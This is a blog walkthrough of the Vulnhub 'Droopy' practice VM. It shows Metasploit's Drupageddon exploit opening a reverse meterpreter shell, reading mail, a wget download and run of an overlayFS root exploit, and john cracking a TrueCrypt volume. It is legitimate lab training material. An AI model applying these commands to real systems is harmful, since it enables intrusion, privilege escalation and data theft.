@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>Vulnhub Droopy | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2016/05/vulnhub-droopy.html" title="Read more" class="entry-title-link">
+                Vulnhub Droopy</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2016-05-10T21:49:00+02:00">10 May 2016</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/drupal.html" title="Read more with the label drupal" class="meta-link">drupal</a> 
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/vulnhub.html" title="Read more with the label vulnhub" class="meta-link">vulnhub</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/linux.html" title="Read more with the label linux" class="meta-link">linux</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 6 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left"
+src="/media/2016.05/droopy.png" alt="Droopy homepage" width="162">
+A few days ago, I installed a new pentesting box based on Arch Linux with Kali</p>
+<p>in a virtual machine. In order to test it I select a light vulnbox on vulnhub :
+<a href="https://www.vulnhub.com/entry/droopy-v02,143/">Droopy</a>.
+There were two hints on the description of the machine on the vulnhub download
+page:</p>
+<ol>
+<li>Grab a copy of the rockyou wordlist.</li>
+<li>It's fun to read other people's email.</li>
+</ol>
+<p>We will see how to use them in a moment :)</p>
+
+
+<h2 id="discovery">Discovery</h2>
+<p>Our nmap scan give us nothing but an open 80 port running a HTTP server.
+Let's give a look to the website:</p>
+<p><img alt="Droopy homepage" src="/media/2016.05/droopy.png"></p>
+<p><a href="https://wappalyzer.com/">Wappalyzer</a> give use the precise version of the Drupal
+used (with the name and to logo of the VM it is easy to deduce that this is a
+Drupal machine). The version is Drupal 7.0 which is vulnerable to CVE-2014-3704
+also called
+<a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon">drupal_drupageddon</a>.</p>
+<h2 id="exploit">Exploit</h2>
+<p>We use metasploit to directly have the Drupal exploit AND directly a
+meterpreter:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">msf</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">search</span><span class="w"> </span><span class="n">drupal</span><span class="w"></span></span>
+<span class="code-line"><span class="p">[</span><span class="o">!</span><span class="p">]</span><span class="w"> </span><span class="n">Module</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">cache</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">built</span><span class="w"> </span><span class="n">yet</span><span class="p">,</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">slow</span><span class="w"> </span><span class="n">search</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">Matching</span><span class="w"> </span><span class="n">Modules</span><span class="w"></span></span>
+<span class="code-line"><span class="o">================</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">  </span><span class="n">Name</span><span class="w">                                           </span><span class="n">Disclosure</span><span class="w"> </span><span class="n">Date</span><span class="w">  </span><span class="n">Rank</span><span class="w">       </span><span class="n">Description</span><span class="w"></span></span>
+<span class="code-line"><span class="w">  </span><span class="o">----</span><span class="w">                                           </span><span class="o">---------------</span><span class="w">  </span><span class="o">----</span><span class="w">       </span><span class="o">-----------</span><span class="w"></span></span>
+<span class="code-line"><span class="w">  </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">drupal_openid_xxe</span><span class="w">             </span><span class="mi">2012</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">17</span><span class="w">       </span><span class="n">normal</span><span class="w">     </span><span class="n">Drupal</span><span class="w"> </span><span class="n">OpenID</span><span class="w"> </span><span class="n">External</span><span class="w"> </span><span class="n">Entity</span><span class="w"> </span><span class="n">Injection</span><span class="w"></span></span>
+<span class="code-line"><span class="w">  </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">drupal_views_user_enum</span><span class="w">  </span><span class="mi">2010</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">02</span><span class="w">       </span><span class="n">normal</span><span class="w">     </span><span class="n">Drupal</span><span class="w"> </span><span class="n">Views</span><span class="w"> </span><span class="n">Module</span><span class="w"> </span><span class="n">Users</span><span class="w"> </span><span class="n">Enumeration</span><span class="w"></span></span>
+<span class="code-line"><span class="w">  </span><span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">drupal_drupageddon</span><span class="w">          </span><span class="mi">2014</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">15</span><span class="w">       </span><span class="n">excellent</span><span class="w">  </span><span class="n">Drupal</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="n">Parameter</span><span class="w"> </span><span class="n">Key</span><span class="o">/</span><span class="n">Value</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">Injection</span><span class="w"></span></span>
+<span class="code-line"><span class="w">  </span><span class="n">exploit</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">php_xmlrpc_eval</span><span class="w">            </span><span class="mi">2005</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">29</span><span class="w">       </span><span class="n">excellent</span><span class="w">  </span><span class="n">PHP</span><span class="w"> </span><span class="n">XML</span><span class="o">-</span><span class="n">RPC</span><span class="w"> </span><span class="n">Arbitrary</span><span class="w"> </span><span class="n">Code</span><span class="w"> </span><span class="n">Execution</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>We set the RHOST to the VM's IP address</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>msf exploit(drupal_drupageddon) &gt; set RHOST 10.0.2.4</span>
+<span class="code-line"></code></pre></div>
+
+<p>We check our options</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>msf exploit(drupal_drupageddon) &gt; show options</span>
+<span class="code-line"></span>
+<span class="code-line">Module options (exploit/multi/http/drupal_drupageddon):</span>
+<span class="code-line"></span>
+<span class="code-line">  Name       Current Setting  Required  Description</span>
+<span class="code-line">  ----       ---------------  --------  -----------</span>
+<span class="code-line">  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span>
+<span class="code-line">  RHOST      10.0.2.4         yes       The target address</span>
+<span class="code-line">  RPORT      80               yes       The target port</span>
+<span class="code-line">  SSL        false            no        Negotiate SSL/TLS for outgoing connections</span>
+<span class="code-line">  TARGETURI  /                yes       The target URI of the Drupal installation</span>
+<span class="code-line">  VHOST                       no        HTTP server virtual host</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">Payload options (php/meterpreter/reverse_tcp):</span>
+<span class="code-line"></span>
+<span class="code-line">  Name   Current Setting  Required  Description</span>
+<span class="code-line">  ----   ---------------  --------  -----------</span>
+<span class="code-line">  LHOST  10.0.2.15        yes       The listen address</span>
+<span class="code-line">  LPORT  4444             yes       The listen port</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">Exploit target:</span>
+<span class="code-line"></span>
+<span class="code-line">  Id  Name</span>
+<span class="code-line">  --  ----</span>
+<span class="code-line">  0   Drupal 7.0 - 7.31</span>
+<span class="code-line"></code></pre></div>
+
+<p>We launch our exploit against the server and praise for a reverse shell:
+    msf exploit(drupal_drupageddon) &gt; exploit</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">Started</span><span class="w"> </span><span class="n">reverse</span><span class="w"> </span><span class="n">TCP</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="mf">10.0.2.15</span><span class="o">:</span><span class="mi">4444</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Testing</span><span class="w"> </span><span class="n">page</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Creating</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">ULMihKJWdb</span><span class="o">:</span><span class="n">giXrJOFefa</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Logging</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="kr">as</span><span class="w"> </span><span class="n">ULMihKJWdb</span><span class="o">:</span><span class="n">giXrJOFefa</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Trying</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="nf">parse</span><span class="w"> </span><span class="n">enabled</span><span class="w"> </span><span class="n">modules</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Enabling</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">PHP</span><span class="w"> </span><span class="n">filter</span><span class="w"> </span><span class="kr">module</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Setting</span><span class="w"> </span><span class="n">permissions</span><span class="w"> </span><span class="n">for</span><span class="w"> </span><span class="n">PHP</span><span class="w"> </span><span class="n">filter</span><span class="w"> </span><span class="kr">module</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Getting</span><span class="w"> </span><span class="n">tokens</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">article</span><span class="w"> </span><span class="n">page</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Calling</span><span class="w"> </span><span class="n">preview</span><span class="w"> </span><span class="n">page</span><span class="p">.</span><span class="w"> </span><span class="n">Exploit</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="n">trigger</span><span class="p">...</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Sending</span><span class="w"> </span><span class="n">stage</span><span class="w"> </span><span class="p">(</span><span class="mi">33721</span><span class="w"> </span><span class="n">bytes</span><span class="p">)</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="mf">10.0.2.4</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Meterpreter</span><span class="w"> </span><span class="n">session</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">opened</span><span class="w"> </span><span class="p">(</span><span class="mf">10.0.2.15</span><span class="o">:</span><span class="mi">4444</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="mf">10.0.2.4</span><span class="o">:</span><span class="mi">52349</span><span class="p">)</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mi">2016</span><span class="o">-</span><span class="mo">05</span><span class="o">-</span><span class="mi">10</span><span class="w"> </span><span class="mi">16</span><span class="o">:</span><span class="mi">56</span><span class="o">:</span><span class="mi">46</span><span class="w"> </span><span class="o">+</span><span class="mo">0200</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="second-hint">Second hint</h2>
+<p>Okay it works, we got a meterperter with the user <code>www-data</code>, let's follow the
+hint a get a look to the e-mails:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">meterpreter</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Listing</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span><span class="w"></span></span>
+<span class="code-line"><span class="o">==================</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">Mode</span><span class="w">              </span><span class="n">Size</span><span class="w">  </span><span class="n">Type</span><span class="w">  </span><span class="n">Last</span><span class="w"> </span><span class="n">modified</span><span class="w">              </span><span class="n">Name</span><span class="w"></span></span>
+<span class="code-line"><span class="o">----</span><span class="w">              </span><span class="o">----</span><span class="w">  </span><span class="o">----</span><span class="w">  </span><span class="o">-------------</span><span class="w">              </span><span class="o">----</span><span class="w"></span></span>
+<span class="code-line"><span class="mi">100777</span><span class="o">/</span><span class="n">rwxrwxrwx</span><span class="w">  </span><span class="mi">564</span><span class="w">   </span><span class="n">fil</span><span class="w">   </span><span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">14</span><span class="w"> </span><span class="mi">20</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">01</span><span class="w"> </span><span class="o">+</span><span class="mi">0200</span><span class="w">  </span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>Let's read the e-mails of www-data:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="k">From</span><span class="w"> </span><span class="n">Dave</span><span class="w"> </span><span class="o">&lt;</span><span class="n">dave</span><span class="nv">@droopy</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="o">&gt;</span><span class="w"> </span><span class="n">Wed</span><span class="w"> </span><span class="n">Thu</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="n">Apr</span><span class="w"> </span><span class="mi">04</span><span class="err">:</span><span class="mi">34</span><span class="err">:</span><span class="mi">39</span><span class="w"> </span><span class="mi">2016</span><span class="w"></span></span>
+<span class="code-line"><span class="nc">Date</span><span class="err">:</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="n">Apr</span><span class="w"> </span><span class="mi">2016</span><span class="w"> </span><span class="mi">04</span><span class="err">:</span><span class="mi">34</span><span class="err">:</span><span class="mi">39</span><span class="w"> </span><span class="o">+</span><span class="mi">0100</span><span class="w"></span></span>
+<span class="code-line"><span class="k">From</span><span class="err">:</span><span class="w"> </span><span class="n">Dave</span><span class="w"> </span><span class="o">&lt;</span><span class="n">dave</span><span class="nv">@droopy</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="o">&gt;</span><span class="w"></span></span>
+<span class="code-line"><span class="nl">Subject</span><span class="p">:</span><span class="w"> </span><span class="n">rockyou</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">nice</span><span class="w"> </span><span class="n">hat</span><span class="err">!</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Message</span><span class="o">-</span><span class="nl">ID</span><span class="p">:</span><span class="w"> </span><span class="o">&lt;</span><span class="mi">730262568</span><span class="nv">@example</span><span class="p">.</span><span class="n">com</span><span class="o">&gt;</span><span class="w"></span></span>
+<span class="code-line"><span class="n">X</span><span class="o">-</span><span class="nl">IMAP</span><span class="p">:</span><span class="w"> </span><span class="mi">0080081351</span><span class="w"> </span><span class="mi">0000002016</span><span class="w"></span></span>
+<span class="code-line"><span class="nl">Status</span><span class="p">:</span><span class="w"> </span><span class="n">NN</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">George</span><span class="p">,</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">  </span><span class="n">I</span><span class="s1">&#39;ve updated the encrypted file... You didn&#39;</span><span class="n">t</span><span class="w"> </span><span class="n">leave</span><span class="w"> </span><span class="ow">any</span><span class="w"></span></span>
+<span class="code-line"><span class="n">hints</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">me</span><span class="p">.</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">isn</span><span class="s1">&#39;t longer than 11 characters</span></span>
+<span class="code-line"><span class="s1">and anyway, we know what academy we went to, don&#39;</span><span class="n">t</span><span class="w"> </span><span class="n">you</span><span class="p">...</span><span class="vm">?</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">I</span><span class="s1">&#39;m sure you&#39;</span><span class="n">ll</span><span class="w"> </span><span class="n">figure</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="k">out</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">won</span><span class="err">&#39;</span><span class="n">t</span><span class="w"> </span><span class="n">rockyou</span><span class="w"> </span><span class="n">too</span><span class="w"> </span><span class="n">much</span><span class="err">!</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">If</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">still</span><span class="w"> </span><span class="n">struggling</span><span class="p">,</span><span class="w"> </span><span class="n">remember</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">song</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">Jam</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">Later</span><span class="p">,</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Dave</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<p>We need a privilege escalation. Like for
+<a href="http://maggick.fr/2015/06/vulnhub-fart-knocker.html#CVE-2015-1328">Fart-knocker</a>
+We can use the CVE-2015-1328 exploiting overlayFS to get a root shell on the
+machine.</p>
+<p>We spawn a shell:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>meterpreter &gt; shell</span>
+<span class="code-line">Process 1233 created.</span>
+<span class="code-line">Channel 1 created.</span>
+<span class="code-line"></code></pre></div>
+
+<p>We still have the permissions of <code>www-data</code>:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>id</span>
+<span class="code-line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+<span class="code-line"></code></pre></div>
+
+<p>We download the exploit <code>ofs.c</code>:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">wget</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">download</span><span class="o">/</span><span class="mi">37292</span><span class="w"></span></span>
+<span class="code-line"><span class="o">--</span><span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">10</span><span class="w"> </span><span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">12</span><span class="o">--</span><span class="w">  </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">download</span><span class="o">/</span><span class="mi">37292</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Resolving</span><span class="w"> </span><span class="n">www</span><span class="o">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="o">.</span><span class="n">com</span><span class="w"> </span><span class="p">(</span><span class="n">www</span><span class="o">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="o">.</span><span class="n">com</span><span class="p">)</span><span class="o">...</span><span class="w"> </span><span class="mf">192.124</span><span class="o">.</span><span class="mf">249.8</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Connecting</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">www</span><span class="o">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="o">.</span><span class="n">com</span><span class="w"> </span><span class="p">(</span><span class="n">www</span><span class="o">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="o">.</span><span class="n">com</span><span class="p">)</span><span class="o">|</span><span class="mf">192.124</span><span class="o">.</span><span class="mf">249.8</span><span class="o">|</span><span class="p">:</span><span class="mf">443.</span><span class="o">..</span><span class="w"> </span><span class="n">connected</span><span class="o">.</span><span class="w"></span></span>
+<span class="code-line"><span class="n">HTTP</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="n">sent</span><span class="p">,</span><span class="w"> </span><span class="n">awaiting</span><span class="w"> </span><span class="n">response</span><span class="o">...</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="n">OK</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">5123</span><span class="w"> </span><span class="p">(</span><span class="mf">5.0</span><span class="n">K</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="n">application</span><span class="o">/</span><span class="n">txt</span><span class="p">]</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Saving</span><span class="w"> </span><span class="n">to</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;37292&#39;</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="w">    </span><span class="mi">0</span><span class="n">K</span><span class="w"> </span><span class="o">.....</span><span class="w">                                                 </span><span class="mi">100</span><span class="o">%</span><span class="w">  </span><span class="mi">358</span><span class="n">M</span><span class="o">=</span><span class="mi">0</span><span class="n">s</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="mi">2016</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">10</span><span class="w"> </span><span class="mi">15</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">12</span><span class="w"> </span><span class="p">(</span><span class="mi">358</span><span class="w"> </span><span class="n">MB</span><span class="o">/</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="s1">&#39;37292&#39;</span><span class="w"> </span><span class="n">saved</span><span class="w"> </span><span class="p">[</span><span class="mi">5123</span><span class="o">/</span><span class="mi">5123</span><span class="p">]</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>We rename the file:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>mv 37292 ofs.c</span>
+<span class="code-line"></code></pre></div>
+
+<p>We compile it and add execution permission:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>gcc ofs.c -o ofs</span>
+<span class="code-line">chmod +x ofs</span>
+<span class="code-line"></code></pre></div>
+
+<p>Then we just run it to gain root privileges on the box:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>./ofs</span>
+<span class="code-line">collect2: error: ld returned 1 exit status</span>
+<span class="code-line">spawning threads</span>
+<span class="code-line">mount #1</span>
+<span class="code-line">mount #2</span>
+<span class="code-line">child threads done</span>
+<span class="code-line">/etc/ld.so.preload created</span>
+<span class="code-line">creating shared library</span>
+<span class="code-line">sh: 0: can&#39;t access tty; job control turned off</span>
+<span class="code-line">id</span>
+<span class="code-line"># uid=0(root) gid=0(root) groups=0(root),33(www-data)</span>
+<span class="code-line"></code></pre></div>
+
+<p>Okay let us search for the flag:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ls /root/</span>
+<span class="code-line"># dave.tc</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="first-hint">First hint</h2>
+<p>It seems we have a truecrypt volume, let's download it on our machine for more
+investigation:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">cp</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">dave</span><span class="o">.</span><span class="n">tc</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>Then we can download it directly from the server at <code>http://10.0.2.4/dave.tc</code></p>
+<p>We need to extract the hashes from the file to pass them to john, hopefully a
+tool exist just for that (we need to compile it):</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>http://article.gmane.org/gmane.comp.security.openwall.john.user/5320</span>
+<span class="code-line"></code></pre></div>
+
+<p>As the mail mention the academy and the hint mention the rockyou password list,
+let us just extract the academy related passwords from it:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>grep academy /media/sf_password_lists/rockyou.txt &gt; /tmp/test</span>
+<span class="code-line"></code></pre></div>
+
+<p>We launch john against the file with our partial rockyou list:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>john dave.tc.john -w=/tmp/test</span>
+<span class="code-line">Warning: detected hash type &quot;tc_aes_xts&quot;, but the string is also recognized as &quot;tc_ripemd160&quot;</span>
+<span class="code-line">Use the &quot;--format=tc_ripemd160&quot; option to force loading these as that type instead</span>
+<span class="code-line">Using default input encoding: UTF-8</span>
+<span class="code-line">Loaded 6 password hashes with 6 different salts (tc_aes_xts, TrueCrypt AES256_XTS [SHA512 128/128 AVX 2x /RIPEMD160/WHIRLPOOL])</span>
+<span class="code-line">Loaded hashes with cost 1 (hash algorithm [1:SHA512 2:RIPEMD160 3:Whirlpool]) varying from 1 to 3</span>
+<span class="code-line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
+<span class="code-line">0g 0:00:00:01 54.22% (ETA: 17:16:27) 0g/s 59.89p/s 359.3c/s 359.3C/s fordacademy..ffmusicacademy</span>
+<span class="code-line">etonacademy      (truecrypt_normal_volume)</span>
+<span class="code-line">1g 0:00:00:03 DONE (2016-05-10 17:16) 0.2724g/s 59.94p/s 331.8c/s 331.8C/s 06academy..!academy</span>
+<span class="code-line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span>
+<span class="code-line">Session completed</span>
+<span class="code-line"></code></pre></div>
+
+<p>We mount the container using veracrypt:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>veracrypt dave.tc -tc</span>
+<span class="code-line"></code></pre></div>
+
+<p>Let us do a <code>tree -a</code> to see what file we have in this container:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>.</span>
+<span class="code-line">├── buller</span>
+<span class="code-line">│   └── BullingdonCrest.jpg</span>
+<span class="code-line">├── lost+found [error opening dir]</span>
+<span class="code-line">├── panama</span>
+<span class="code-line">│   └── shares.jpg</span>
+<span class="code-line">└── .secret</span>
+<span class="code-line">    ├── piers.png</span>
+<span class="code-line">    └── .top</span>
+<span class="code-line">        └── flag.txt</span>
+<span class="code-line"></span>
+<span class="code-line">5 directories, 4 files</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>Content of ./secret/.top/flag.txt</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>################################################################################</span>
+<span class="code-line">#   ___ ___  _  _  ___ ___    _ _____ _   _ _      _ _____ ___ ___  _  _  ___  #</span>
+<span class="code-line">#  / __/ _ \| \| |/ __| _ \  /_\_   _| | | | |    /_\_   _|_ _/ _ \| \| |/ __| #</span>
+<span class="code-line"># | (_| (_) | .` | (_ |   / / _ \| | | |_| | |__ / _ \| |  | | (_) | .` |\__ \ #</span>
+<span class="code-line">#  \___\___/|_|\_|\___|_|_\/_/ \_\_|  \___/|____/_/ \_\_| |___\___/|_|\_||___/ #</span>
+<span class="code-line">#                                                                              #</span>
+<span class="code-line">################################################################################</span>
+<span class="code-line"></span>
+<span class="code-line">Firstly, thanks for trying this VM. If you have rooted it, well done!</span>
+<span class="code-line"></span>
+<span class="code-line">Shout-outs go to #vulnhub for hosting a great learning tool. A special thanks</span>
+<span class="code-line">goes to barrebas and junken for help in testing and final configuration.</span>
+<span class="code-line">                                                                --knightmare</span>
+<span class="code-line"></code></pre></div>
+
+<p>It was a nice challenge, mainly for the beginner, probably a lack in the web
+part (or the use of metapsloit, spoil myself of some fun exploiting the SQL
+injection manually).</p>
+<p>Thanks to knightmare for the VM and as always thanks to vulnhub !</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2016/04/installing-osmc-without-installer.html"> Installing OSMC without installer </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2016/05/vulnhub-sectalks-bne0x03-simple.html"> Vulnhub SecTalks: BNE0x03 - Simple </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
